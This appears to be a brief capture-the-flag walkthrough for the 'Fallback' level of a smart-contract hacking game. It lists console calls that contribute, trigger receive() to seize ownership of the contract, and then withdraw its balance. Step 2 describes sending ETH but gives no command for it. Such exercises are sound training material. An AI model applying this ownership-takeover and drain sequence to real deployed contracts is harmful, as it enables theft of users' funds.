# Fallback

1 Contribute to pass the requirement

```javascript
await contract.contribute({ value: 1 })
```

2 Send some ETH to the contract to trigger receive()

now, you should be the owner

```javascript
await contract.owner()
```

then call withdraw()

```javascript
await contract.withdraw()
```

Done :)
